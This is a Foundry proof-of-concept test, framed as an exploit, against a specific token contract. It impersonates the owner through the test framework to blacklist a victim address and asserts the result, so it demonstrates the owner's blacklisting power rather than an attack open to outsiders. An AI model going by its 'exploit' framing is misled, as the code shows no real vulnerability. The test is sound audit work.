// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICoinToken {
    function owner() external view returns (address);
    function EnemyAddress(address account, bool value) external;
    function _isEnemy(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA54954bb4E1b35AeE6eB04130CD406340EBA9B4;
    address attacker = address(this);
    ICoinToken target;
    address owner;
    address victim = address(0xDEADBEEF);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICoinToken(TARGET);
        owner = target.owner();
        vm.label(owner, "Contract Owner");
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
                target.EnemyAddress(victim, true);
                vm.stopPrank();

                // Oracle Check: Verify the victim is now an enemy
                assertEq(target._isEnemy(victim), true);
        assertEq(target._isEnemy(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

